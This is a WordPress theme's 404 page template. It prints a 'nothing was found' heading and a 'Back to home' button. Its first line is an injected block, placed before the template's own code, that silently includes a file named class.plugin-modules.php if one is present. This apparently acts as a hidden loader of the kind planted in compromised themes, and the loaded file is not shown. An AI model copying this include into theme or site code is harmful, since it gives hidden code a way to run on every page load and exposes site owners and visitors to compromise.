<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
get_header();

?>

<div id="main" class="main main--404">
  <div class="content content--404">
    <!-- Add Content Here -->
    <header class="e404__title">
      <h1><?php _e( '404', 'gecko' ); ?></h1>
    </header>
    <div class="e404__content">
      <h3><?php _e( 'It looks like nothing was found at this location.', 'gecko' ); ?></h3>
    </div>
    <div class="e404__button">
    <a class="button" href="<?php echo home_url(); ?>"><i class="gc-icon-angle-left"></i> <?php _e( 'Back to home', 'gecko' ); ?></a>
    </div>
  </div>
</div>

<?php

get_footer();
